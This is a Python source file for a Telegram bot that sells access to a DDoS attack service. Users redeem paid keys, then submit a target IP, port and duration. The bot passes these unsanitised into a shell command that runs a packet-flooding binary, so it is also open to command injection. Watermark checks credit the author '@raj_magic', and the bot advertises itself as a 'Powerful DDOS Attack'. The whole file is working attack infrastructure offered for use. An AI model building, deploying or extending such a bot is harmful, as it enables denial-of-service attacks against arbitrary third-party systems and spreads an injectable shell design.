import time
import random
import string
import logging
from threading import Thread
import json
import hashlib
import os
import telebot
import asyncio
from datetime import datetime, timedelta
import uuid

# Watermark verification
CREATOR = "This File Is Made By @raj_magic"
BotCode = "2cf29b3b13bc0a3d344604210fc71907a768530a7b450ebd77f21c501811787b"

def verify():
    current_hash = hashlib.sha256(CREATOR.encode()).hexdigest()
    if current_hash != BotCode:
        raise Exception("File verification failed. Unauthorized modification detected.")

verify()

def verify():
    # Read the watermark text
    with open('developer.txt', 'r') as file:
        watermark_text = file.read().strip()

    # Compute the hash of the watermark
    computed_hash = hashlib.sha256(watermark_text.encode()).hexdigest()

    # Read the stored hash
    with open('attack.txt', 'r') as file:
        stored_hash = file.read().strip()

    # Check if the computed hash matches the stored hash
    if computed_hash != stored_hash:
        raise Exception("This File Is Made By @raj_magic.")
    print("This File Is Made By @raj_magic.")

verify()

# Load configuration
with open('config.json') as config_file:
    config = json.load(config_file)

BOT_TOKEN = config['bot_token']
ADMIN_IDS = config['admin_ids']

bot = telebot.TeleBot(BOT_TOKEN)

# File paths
USERS_FILE = 'users.txt'

def load_users():
    if not os.path.exists(USERS_FILE):
        return []
    users = []
    with open(USERS_FILE, 'r') as f:
        for line in f:
            try:
                user_data = json.loads(line.strip())
                print(f"Loaded user data: {user_data}")  # Debugging
                users.append(user_data)
            except json.JSONDecodeError:
                logging.error(f"Invalid JSON format in line: {line}")
    return users

def save_users(users):
    with open(USERS_FILE, 'w') as f:
        for user in users:
            f.write(f"{json.dumps(user)}\n")

# Initialize users
users = load_users()

# Blocked ports
blocked_ports = [8700, 20000, 443, 17500, 9031, 20002, 20001]

# Async function to run attack command
async def run_attack_command_on_codespace(target_ip, target_port, duration, chat_id):
    # Updated command without the last 60
    command = f"./packet_sender {target_ip} {target_port} {duration}"
    try:
        process = await asyncio.create_subprocess_shell(
            command,
            stdout=asyncio.subprocess.PIPE,
            stderr=asyncio.subprocess.PIPE
        )
        stdout, stderr = await process.communicate()
        output = stdout.decode()
        error = stderr.decode()

        if output:
            logging.info(f"Command output: {output}")
        if error:
            logging.error(f"Command error: {error}")

        # Notify user when the attack finishes
        bot.send_message(chat_id, "𝗔𝘁𝘁𝗮𝗰𝗸 𝗙𝗶𝗻𝗶𝘀𝗵𝗲𝗱 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆 🚀")
    except Exception as e:
        logging.error(f"Failed to execute command on Codespace: {e}")

# Function to check if a user is an admin
def is_user_admin(user_id):
    return user_id in ADMIN_IDS

# Function to check if a user is approved
def check_user_approval(user_id):
    # Allow admins to bypass approval check
    if user_id in ADMIN_IDS:
        return True

    # Check if the user is approved based on the plan and valid_until date
    for user in users:
        if user['user_id'] == user_id and user['plan'] > 0 and datetime.strptime(user['valid_until'], "%Y-%m-%d") > datetime.now():
            return True
    return False

# Send a not approved message
def send_not_approved_message(chat_id):
    bot.send_message(chat_id, "*You Are Not Authorized ⚠*", parse_mode='Markdown')

def generate_key():
    return ''.join(random.choices(string.ascii_letters + string.digits, k=16))
    
# Generate a key for a user
@bot.message_handler(commands=['genkey'])
def genkey_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id
    cmd_parts = message.text.split()

    if len(cmd_parts) != 2:
        bot.send_message(chat_id, "*Invalid command format. Use /genkey <days>*", parse_mode='Markdown')
        return

    try:
        days = int(cmd_parts[1])
    except ValueError:
        bot.send_message(chat_id, "*Invalid number of days. Please provide a valid number.*", parse_mode='Markdown')
        return

    # Check if the user is authorized
    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    # Generate a key and set the expiration date
    gen_key = generate_key()
    valid_until = (datetime.now() + timedelta(days=days)).date().isoformat()

    # Update or create user data
    user_found = False
    for user in users:
        if user.get('user_id') == user_id:
            user['genkey'] = gen_key
            user['genkey_valid_until'] = valid_until
            user_found = True
            break

    if not user_found:
        # If the user isn't found, create a new user entry with the genkey
        user_info = {
            "user_id": user_id,
            "plan": 0,  # Default plan
            "valid_until": datetime.now().date().isoformat(),
            "access_count": 0,
            "genkey": gen_key,
            "genkey_valid_until": valid_until
        }
        users.append(user_info)

    save_users(users)

    # Send the generated key and validity period to the user
    bot.send_message(chat_id, f"Your generated key is🥹: `{gen_key}`\nIt is valid until: {valid_until}\nNote:It will expired in 20 Seconds 😲", parse_mode='Markdown')

# Redeem a key for a user
@bot.message_handler(commands=['redeem'])
def redeem_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    try:
        key = message.text.split()[1]  # Get the key from the message
    except IndexError:
        bot.send_message(chat_id, "*Please provide a valid key after the /redeem command.*", parse_mode='Markdown')
        return

    # Check if the key exists and is valid
    for user in users:
        if user['genkey'] == key and user['valid_until'] >= datetime.now().date().isoformat():
            user['plan'] = 199  # Activate the plan for the user
            save_users(users)
            bot.send_message(chat_id, "*Key redeemed successfully! Your plan has been activated and now enjoy.*", parse_mode='Markdown')
            return

    bot.send_message(chat_id, "*Invalid or expired key.*", parse_mode='Markdown')

# Attack command
@bot.message_handler(commands=['Attack'])
def attack_command(message):
    user_id = message.from_user.id
    chat_id = message.chat.id

    if not check_user_approval(user_id):
        send_not_approved_message(chat_id)
        return

    try:
        bot.send_message(chat_id, "*Enter the target IP, port, and duration (in seconds) separated by spaces.*", parse_mode='Markdown')
        bot.register_next_step_handler(message, process_attack_command, chat_id)
    except Exception as e:
        logging.error(f"Error in attack command: {e}")

def process_attack_command(message, chat_id):
    try:
        args = message.text.split()
        if len(args) != 3:
            bot.send_message(chat_id, "*Invalid command format. Please use: target_ip target_port duration*", parse_mode='Markdown')
            return
        target_ip, target_port, duration = args[0], int(args[1]), args[2]

        if target_port in blocked_ports:
            bot.send_message(chat_id, f"*Port {target_port} is blocked. Please use a different port.*", parse_mode='Markdown')
            return

        asyncio.run_coroutine_threadsafe(run_attack_command_on_codespace(target_ip, target_port, duration, chat_id), loop)
        bot.send_message(chat_id, f"🚀 𝗔𝘁𝘁𝗮𝗰𝗸 𝗦𝗲𝗻𝘁 𝗦𝘂𝗰𝗰𝗲𝘀𝘀𝗳𝘂𝗹𝗹𝘆! 🚀\n\n𝗧𝗮𝗿𝗴𝗲𝘁: {target_ip}\n𝗣𝗼𝗿𝘁:{target_port}\n𝗔𝘁𝘁𝗮𝗰𝗸 𝗧𝗶𝗺𝗲: {duration} seconds")
    except Exception as e:
        logging.error(f"Error in processing attack command: {e}")

# /owner command handler
@bot.message_handler(commands=['owner'])
def send_owner_info(message):
    owner_message = "This Bot Has Been Developed By @raj_magic"
    bot.send_message(message.chat.id, owner_message)

# Status command
@bot.message_handler(commands=['status'])
def status_command(message):
    try:
        response = "*System status information*"
        bot.send_message(message.chat.id, response, parse_mode='Markdown')
    except Exception as e:
        logging.error(f"Error in status command: {e}")

# Start asyncio thread
def start_asyncio_thread():
    asyncio.set_event_loop(loop)
    loop.run_forever()

from telebot.types import ReplyKeyboardMarkup, KeyboardButton

# Welcome message and buttons when the user sends /start command
@bot.message_handler(commands=['start'])
def send_welcome(message):
    user_id = message.from_user.id
    username = message.from_user.username

    # Create the markup and buttons
    markup = ReplyKeyboardMarkup(resize_keyboard=True)
    btn_attack = KeyboardButton("Super Attack 🚀")
    btn_account = KeyboardButton("My Info🏦")
    markup.add(btn_attack, btn_account)

    # Welcome message
    welcome_message = (f"Welcome to our Powerful DDOS Attack, @{username}!\n\n"
                       f"Please choose an option below to continue.")

    bot.send_message(message.chat.id, welcome_message, reply_markup=markup)

# Handle messages
@bot.message_handler(func=lambda message: True)
def echo_message(message):
    try:
        user_id = message.from_user.id
        chat_id = message.chat.id

        # Debugging line: Check if the user is in the users list
        print(f"Checking approval for user_id: {user_id}")
        
        if message.text == "Super Attack 🚀":
            # Debugging: Checking approval
            if not check_user_approval(user_id):
                print(f"User {user_id} is NOT approved.")
                # Send the "You are not approved" message if not approved
                send_not_approved_message(chat_id)
            else:
                print(f"User {user_id} is approved.")
                # Proceed with the attack if the user is approved
                attack_command(message)
        elif message.text == "My Info🏦":
            user_found = False
            for user in users:
                if user.get('user_id') == user_id:
                    username = message.from_user.username
                    plan = user.get('plan', 'N/A')
                    valid_until = user.get('valid_until', 'N/A')
                    genkey = user.get('genkey', 'N/A')
                    genkey_valid_until = user.get('genkey_valid_until', 'N/A')

                    response = (f"*USERNAME: @{username}\n"
                                f"Plan: {plan}\n"
                                f"Valid Until: {genkey_valid_until}*")

                    bot.send_message(chat_id, response, parse_mode='Markdown')
                    user_found = True
                    break

            if not user_found:
                bot.send_message(chat_id, "*You are not an approved user.*", parse_mode='Markdown')
        else:
            bot.send_message(message.chat.id, "Uff Shi se dalo na 🥴🥴")
    except Exception as e:
        logging.error(f"Error in echo_message: {e}")

# Start the bot
if __name__ == '__main__':
    logging.basicConfig(level=logging.INFO)
    loop = asyncio.new_event_loop()
    thread = Thread(target=start_asyncio_thread)
    thread.start()
    bot.polling()
